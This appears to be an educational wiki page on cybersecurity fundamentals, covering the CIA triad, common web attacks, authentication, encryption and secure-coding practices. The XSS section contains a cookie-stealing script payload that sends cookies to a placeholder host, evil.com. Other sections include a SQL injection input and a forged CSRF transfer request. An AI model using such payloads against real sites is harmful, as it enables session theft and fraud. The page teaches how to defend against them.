# Cybersecurity Fundamentals

## Overview

Cybersecurity protects systems, networks, and data from digital attacks, unauthorized access, and damage. Understanding security principles is essential for every software engineer, not just security specialists.

## Key Concepts

### The CIA Triad

```
            Confidentiality
                 /\
                /  \
               /    \
              / CIA  \
             / Triad  \
            /          \
           /____________\
   Integrity          Availability
```

| Principle | Description | Threats |
|-----------|-------------|---------|
| **Confidentiality** | Data accessible only to authorized users | Data leaks, eavesdropping |
| **Integrity** | Data is accurate and unaltered | Tampering, man-in-the-middle |
| **Availability** | Systems accessible when needed | DDoS, hardware failure |

## Common Attack Types

### SQL Injection

```sql
-- Vulnerable code (NEVER do this)
query = "SELECT * FROM users WHERE username = '" + userInput + "'"

-- Attack input: admin' --
-- Resulting query:
SELECT * FROM users WHERE username = 'admin' --'

-- Parameterized query (SAFE)
cursor.execute("SELECT * FROM users WHERE username = %s", (userInput,))
```

### Cross-Site Scripting (XSS)

```javascript
// Vulnerable: Direct HTML insertion
element.innerHTML = userInput;

// Attack: <script>document.location='https://evil.com/?c='+document.cookie</script>

// Safe: Use textContent or sanitize
element.textContent = userInput;

// Or use DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### Cross-Site Request Forgery (CSRF)

```
Attack flow:
1. User logs into bank.com (session cookie set)
2. User visits evil.com
3. evil.com contains: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Browser sends request with bank.com cookies automatically

Protection: CSRF tokens, SameSite cookies, Origin checking
```

### Attack Comparison

| Attack | Target | Method | Prevention |
|--------|--------|--------|------------|
| SQL Injection | Database | Malicious SQL input | Parameterized queries |
| XSS | Users | Injecting scripts | Input sanitization, CSP |
| CSRF | Users | Forged requests | CSRF tokens, SameSite |
| DDoS | Services | Traffic flooding | Rate limiting, CDNs |
| MITM | Communication | Intercepting traffic | HTTPS, certificate pinning |
| Brute Force | Authentication | Guessing passwords | Rate limiting, lockouts |

## Authentication vs Authorization

| Aspect | Authentication | Authorization |
|--------|----------------|---------------|
| **Question** | Who are you? | What can you do? |
| **Methods** | Passwords, biometrics, MFA | RBAC, ABAC, ACL |
| **Timing** | Before authorization | After authentication |
| **Protocols** | OAuth, SAML, OpenID Connect | JWT claims, roles |

### JWT Token Structure

```json
// Header
{ "alg": "RS256", "typ": "JWT" }

// Payload
{
  "sub": "user123",
  "name": "Alice",
  "roles": ["admin", "editor"],
  "iat": 1700000000,
  "exp": 1700003600
}

// Signature
RSASHA256(base64(header) + "." + base64(payload), privateKey)
```

## Encryption Basics

### Symmetric vs Asymmetric

| Feature | Symmetric | Asymmetric |
|---------|-----------|------------|
| **Keys** | Same key encrypt/decrypt | Public/private key pair |
| **Speed** | Fast | Slow |
| **Key Distribution** | Problematic | Easier (public key) |
| **Examples** | AES, ChaCha20 | RSA, ECC |
| **Use Case** | Bulk data encryption | Key exchange, signatures |

### TLS Handshake Summary

```
Client                              Server
  │                                   │
  │──── ClientHello ─────────────────▶│
  │                                   │
  │◀─── ServerHello + Certificate ────│
  │                                   │
  │──── Key Exchange ────────────────▶│
  │                                   │
  │◀══════ Encrypted Traffic ═══════▶│
```

## Security Best Practices

### Input Validation & Output Encoding

```python
import re
import html

def validate_email(email: str) -> bool:
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))

def sanitize_input(user_input: str) -> str:
    """Defense in depth for user input."""
    # 1. Strip whitespace
    cleaned = user_input.strip()
    # 2. Length check
    cleaned = cleaned[:1000]
    # 3. HTML escape
    cleaned = html.escape(cleaned)
    # 4. Remove null bytes
    cleaned = cleaned.replace('\x00', '')
    return cleaned
```

### Security Headers

```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=()
```

### Password Hashing (Python)

```python
import bcrypt

def hash_password(password: str) -> bytes:
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), hashed)
```

## Common Interview Questions

1. **What is the difference between authentication and authorization?** Authentication verifies identity; authorization determines permissions. Authn happens before authz.

2. **Explain the OWASP Top 10.** The most critical web application security risks, including broken access control, cryptographic failures, injection, and XSS.

3. **How does HTTPS protect data?** TLS provides encryption (confidentiality), authentication (server identity), and integrity (tamper detection).

4. **What is principle of least privilege?** Granting only the minimum permissions needed to perform a task, reducing the blast radius of potential breaches.

5. **What is a race condition in security?** When system behavior depends on timing of events, attackers exploit this to bypass checks (e.g., double-spending in payment systems).

## See Also

- [[DevOps-Cloud]]
- [[Web-Development]]
- [[Cheat-Sheets]]

> Full content: [35-Cybersecurity](../35-Cybersecurity/), [36-Ethical-Hacking](../36-Ethical-Hacking/)
